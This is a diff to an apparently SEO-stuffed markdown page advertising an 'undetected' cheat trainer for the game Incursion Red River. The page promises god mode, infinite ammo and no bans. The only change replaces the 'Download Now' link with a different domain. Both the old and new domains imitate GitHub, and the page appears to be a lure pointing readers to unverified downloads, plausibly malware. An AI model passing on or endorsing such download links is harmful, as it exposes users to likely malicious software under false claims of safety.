@@ -4,7 +4,7 @@ Yo, Red River raiders and AI dodgers—it's your boy with 5200+ hours in Incursi
 
 Ever pushed a 4-man into a Delta POI, Solarint AI flanks hard, suppressor jams, full squad downed—lost 2 AKs and rare meds? Happened mid-stream, rage-dropped controller. Discord roasted: "Trainer or uninstall!" They flipped when I toggled **god mode** and ghosted the wipeout squad solo—like Tarkov dev mode but PvE only. This is my refined **Incursion Red River cheats 2026**—clean client-side for co-op/solo extracts. **Undetected Incursion Red River trainer**, **no ban solo** (PVE/co-op local). If you've growled "Incursion Red River mod menu safe post 1.3 hotfix" or "infinite ammo Red River 2026", gear up.
 
-<a href="https://incr.githubcompiller.com/" target="_blank" rel="noopener"><img src="https://t4.ftcdn.net/jpg/08/17/73/81/360_F_817738146_X3Ze6FERyH1vZhPZmv8oOPoRVwucVVKR.jpg" alt="Download Now"></a>
+<a href="https://incr.gitget.cc/" target="_blank" rel="noopener"><img src="https://t4.ftcdn.net/jpg/08/17/73/81/360_F_817738146_X3Ze6FERyH1vZhPZmv8oOPoRVwucVVKR.jpg" alt="Download Now"></a>
 
 ## Setup Faster Than a Delta Sprint 🏃‍♂️
 
